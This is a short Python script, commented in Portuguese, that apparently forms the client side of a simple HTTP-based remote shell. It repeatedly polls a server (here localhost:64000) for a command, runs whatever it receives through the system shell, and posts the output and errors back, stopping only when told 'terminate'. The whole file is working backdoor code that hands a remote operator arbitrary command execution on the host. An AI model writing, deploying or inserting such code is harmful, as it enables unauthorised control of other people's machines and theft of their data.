#Client

import requests     # Requer instalacao via comando 'pip install requests'
import subprocess 
import time
import os

while True: 

    req = requests.get('http://localhost:64000')      # Ip do servidor
    command = req.text                                      

    if 'terminate' in command:
        break 

    else:
        CMD =  subprocess.Popen(command,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
        post_response = requests.post(url='http://localhost:64000', data=CMD.stdout.read() ) 
        post_response = requests.post(url='http://localhost:64000', data=CMD.stderr.read() )  
    time.sleep(3)

    
